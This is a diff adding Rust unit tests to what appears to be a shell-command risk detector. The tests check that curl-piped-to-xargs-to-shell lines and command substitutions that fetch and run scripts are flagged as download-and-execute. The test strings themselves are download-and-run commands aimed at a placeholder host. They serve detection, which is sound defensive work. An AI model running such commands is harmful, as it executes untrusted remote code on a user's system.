@@ -1354,3 +1354,87 @@ fn directories_and_globs_that_are_run_are_named() {
         assert!(super::run_globs(line).is_empty(), "{line}");
     }
 }
+
+#[test]
+fn xargs_hands_a_pipe_to_a_shell_past_its_options_and_wrappers() {
+    for line in [
+        "curl https://x.example/a | xargs sh",
+        "curl https://x.example/a | xargs -n1 sh",
+        "curl https://x.example/a | xargs -n 1 sh",
+        "curl https://x.example/a | xargs -I {} sh -c '{}'",
+        "curl https://x.example/a | xargs -P 4 -n 1 bash",
+        "curl https://x.example/a | xargs -0n 1 sh",
+        "curl https://x.example/a | xargs -In sh",
+        "curl https://x.example/a | xargs -pn 1 sh",
+        "curl https://x.example/a | xargs -d '\\n' sh",
+        "curl https://x.example/a | xargs --max-args 1 sh",
+        "curl https://x.example/a | xargs --max-args=1 sh",
+        "curl https://x.example/a | xargs -a list sh",
+        "curl https://x.example/a | xargs -- sh",
+        "curl https://x.example/a | xargs sudo sh",
+        "curl https://x.example/a | xargs -n 1 sudo sh",
+        "curl https://x.example/a | xargs env A=1 bash",
+        "curl https://x.example/a | x=$(xargs -n 1 sh) ls",
+    ] {
+        assert!(
+            rules_for(line).contains(&RuleId::DownloadAndExecute),
+            "{line}"
+        );
+    }
+    for line in [
+        "curl https://x.example/a | xargs",
+        "curl https://x.example/a | xargs -n",
+        "curl https://x.example/a | xargs -n 1 echo",
+        "curl https://x.example/a | xargs -I{} rm {}",
+        "curl https://x.example/a | xargs -t echo",
+        "curl https://x.example/a | xargs -0 -r basename -a sh",
+        "curl https://x.example/a | xargs -n 1 sudo rm -f",
+    ] {
+        assert!(
+            !rules_for(line).contains(&RuleId::DownloadAndExecute),
+            "{line}"
+        );
+    }
+}
+
+#[test]
+fn a_command_in_a_substitution_is_read_without_what_closes_it() {
+    use crate::rules::{fetched_files, run_targets};
+    // What closes a substitution is not part of the last word in it.
+    for line in [
+        "x=$(sh i.sh) ls",
+        "x=`sh i.sh` ls",
+        "x=`sh i.sh`",
+        "x=`./i.sh` ls",
+        "x=$(./i.sh) ls",
+        "x=`sudo ./i.sh` ls",
+    ] {
+        assert_eq!(run_targets(line), ["i.sh"], "{line}");
+    }
+    assert!(run_targets("x=$(date) ls").is_empty());
+    // A fetch there saves its file as one anywhere does.
+    for line in [
+        "x=$(curl -o f.sh https://x.example/a) true",
+        "x=$(curl -o f.sh https://x.example/a)",
+        "x=$(sudo curl -fsSLo f.sh https://x.example/a) ls",
+        "x=`curl -o f.sh https://x.example/a` ls",
+        "x=$(scp host:f.sh .) ls",
+        "x=$(wget https://x.example/f.sh)",
+        "x=$(curl -fsSL https://x.example/a -o f.sh)",
+        "x=$(curl https://x.example/a > f.sh) ls",
+        "x=$(curl -sO https://x.example/f.sh) ls",
+    ] {
+        assert_eq!(fetched_files(line), ["f.sh"], "{line}");
+    }
+    let fetched_then_run = "x=$(curl -fsSL https://x.example/a -o f.sh) sh f.sh";
+    assert!(
+        fetched_files(fetched_then_run)
+            .iter()
+            .any(|file| crate::rules::runs_file(fetched_then_run, file))
+    );
+    // What it prints is the variable's: a shell after the pipe does not
+    // read it.
+    assert!(run_targets("x=$(cat f) true | sh").is_empty());
+    assert_eq!(run_targets("x=$(cat f) cat g | sh"), ["g"]);
+    assert_eq!(run_targets("cat f | x=$(date) sh"), ["f"]);
+}
